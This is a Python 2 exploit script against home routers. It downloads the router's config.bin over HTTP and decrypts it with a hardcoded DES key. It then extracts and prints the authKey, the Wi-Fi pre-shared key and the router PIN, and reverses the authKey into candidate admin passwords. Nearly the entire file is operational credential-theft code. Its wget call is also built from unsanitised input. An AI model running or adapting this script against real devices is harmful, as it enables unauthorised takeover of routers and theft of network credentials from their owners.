#!/usr/bin/env python
#coding:utf-8
__author__="VegetableCat"
import os
import argparse
import sys

red='\033[1;31m%s\033[0m'
green='\033[1;32m%s\033[0m'
normal='\033[0m'
def decrypt(authKey):


    matrix = [[0 for i in xrange(15)] for i in range(15)]
    passwdLen=0
    strDe = "RDpbLfCPsJZ7fiv"
    dic = "yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciX"+"TysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgML"+"wygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3"+"sfQ1xtXcPcf1aT303wAQhv66qzW"
    passwd=''
    for crIndex in xrange(0,15):

        passwdList=''
        strComp_authkey=authKey[crIndex]
        codeCr=ord(strDe[crIndex])
        for index in xrange(32,127):
            strtmp = chr(index)
            codeCl = ord(strtmp[0]) #index
            strDic = dic[(codeCl ^ codeCr)%255]
            if strComp_authkey == strDic:
                passwdList += strtmp
        matrix[crIndex]=passwdList

    for i in xrange(0,15):
        if len(matrix[i]) == 0:
            passwdLen=i
            break
        elif i == 14:
            passwdLen=15
    for i in xrange(0,passwdLen):
        passwd += matrix[i]+'\n'

    print green % '[*] authKey decrypt result:'
    print passwd
    return passwd


def get_config_bin(url):
    if 'http' not in url:
        url='http://'+url
    shell='wget %s -O /tmp/config.bin' % '/'.join([url,'config.bin'])
    status = os.system(shell)
    if status == 0:
        print green % '[*] get config.bin!'
    else:
        print '\r'
        print red % '[!] get config.bin failed!'
        print red % '[!] check the url or the router not vulnerable!'
        sys.exit(-1)

def get_auth_key(path):

    output = os.popen('openssl enc -d -des-ecb -nopad -K 478DA50BF9E3D2CF -in %s' % path)
    l = output.read().split()
    # print l
    del l[0],l[0],l[0],l[0],l[0]
    d = {}
    for k,v in enumerate(l):
        if k % 2 ==0:
            d[v]=l[k+1]

    print green % '[*] get authKey!'
    print green % '[*] authKey:'+ d['authKey']
    print green % '[*] wifi psk:'+ d['cPskSecret']
    print green % '[*] router pin:'+ d['cUsrPIN']
    return d['authKey']

if __name__ == '__main__':


    parser = argparse.ArgumentParser()
    parser.add_argument('-u',help='the url of router',dest='url',default='192.168.1.1',type=str)
    parser.add_argument('-k',help='authKey',dest='authKey',default=None)
    parser.add_argument('-f',help='the path of config.bin',dest='path',default='/tmp/config.bin')


    args = parser.parse_args()

    url = args.url
    authKey = args.authKey
    path = args.path


    if authKey:
        decrypt(authKey)
        sys.exit(-1)
    if path:
        authKey=get_auth_key(path)
        decrypt(authKey)
        sys.exit(-1)

    authKey=get_auth_key(url)

    decrypt(authKey)
